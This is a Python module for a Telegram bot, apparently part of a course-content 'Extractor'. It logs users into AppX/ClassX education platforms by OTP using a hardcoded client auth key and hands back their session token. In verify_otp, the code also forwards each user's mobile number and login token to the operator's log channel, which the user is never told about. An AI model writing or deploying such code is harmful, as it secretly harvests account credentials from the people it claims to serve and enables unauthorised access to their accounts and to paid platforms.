import aiohttp
import asyncio
import json
from Extractor import app
from pyrogram import filters
import requests
from config import CHANNEL_ID
log_channel = CHANNEL_ID

@app.on_message(filters.command(["appxotp"]))
async def send_otpp(app, message):
    api = await app.ask(message.chat.id, text="SEND APPX API\n\n✅ Example:\nrozgarapinew.teachx.in\nor\ntcsexamzoneapi.classx.co.in")
    api_txt = api.text.strip()
    name = api_txt.split('.')[0].replace("api", "") if api_txt else "AppX"
    if "api" in api_txt or "teachx" in api_txt or "classx" in api_txt:
        await send_otp(app, message, api_txt, name)
    else:
        await app.send_message(message.chat.id, "INVALID INPUT IF YOU DONT KNOW API GO TO FIND API OPTION")
        
async def send_otp(app, message, api, name="AppX"):
    api_base = api if api.startswith(("http://", "https://")) else f"https://{api}"
    input1 = await app.ask(message.chat.id, text="SEND 10-DIGIT MOBILE NUMBER.")
    mobile = input1.text.strip().replace(" ", "").replace("+91", "")
    url = f"{api_base}/get/sendotp?phone={mobile}"
    headers = {
        "Client-Service": "Appx",
        "Auth-Key": "appxapi",
        "source": "website"
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as response:
                response_json = await response.json(content_type=None)
                if response_json.get("status") == 200:
                    await app.send_message(message.chat.id, text="✅ **OTP sent successfully! Please check your SMS.**")
                    await verify_otp(app, message, api_base, mobile)
                    return True
                else:
                    msg = response_json.get("message", "Failed to send OTP")
                    await app.send_message(message.chat.id, text=f"❌ Failed to send OTP: {msg}")
                    return False
    except Exception as e:
        await app.send_message(message.chat.id, text=f"❌ Error sending OTP: {str(e)}")
        return False

async def verify_otp(app, message, api_base, mobile):
    input2 = await app.ask(message.chat.id, text="🔑 **Enter the OTP you received:**")
    otp = input2.text.strip()
    url = f"{api_base}/get/otpverify?useremail={mobile}&otp={otp}&device_id=WebBrowser17267591437616qmd1cxx313&mydeviceid=&mydeviceid2="
    headers = {
        "Client-Service": "Appx",
        "Auth-Key": "appxapi",
        "source": "website"
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as response:
                response_json = await response.json(content_type=None)
                if response_json.get("status") == 200:
                    user_data = response_json.get('data') or response_json.get('user') or {}
                    token = user_data.get('token') if isinstance(user_data, dict) else ""
                    if not token and isinstance(response_json.get('token'), str):
                        token = response_json['token']
                    userid = user_data.get('id') or user_data.get('userid') or "" if isinstance(user_data, dict) else ""
                    dl = f"✅ Login With {mobile}\n\nToken for {api_base}:\n`{token}`\nUser ID: `{userid}`"
                    await message.reply_text(
                        f"✅ <b>OTP Verified Successfully!</b>\n\n"
                        f"📱 <b>Mobile:</b> <code>{mobile}</code>\n"
                        f"🆔 <b>User ID:</b> <code>{userid}</code>\n"
                        f"🔑 <b>Token for {api_base}:</b>\n\n"
                        f"<code>{token}</code>"
                    )
                    await app.send_message(log_channel, dl)
                else:
                    msg = response_json.get('message') or "Invalid OTP"
                    await app.send_message(message.chat.id, text=f"❌ Verification failed: {msg}")
    except Exception as e:
        await app.send_message(message.chat.id, text=f"❌ Verification error: {str(e)}")


    
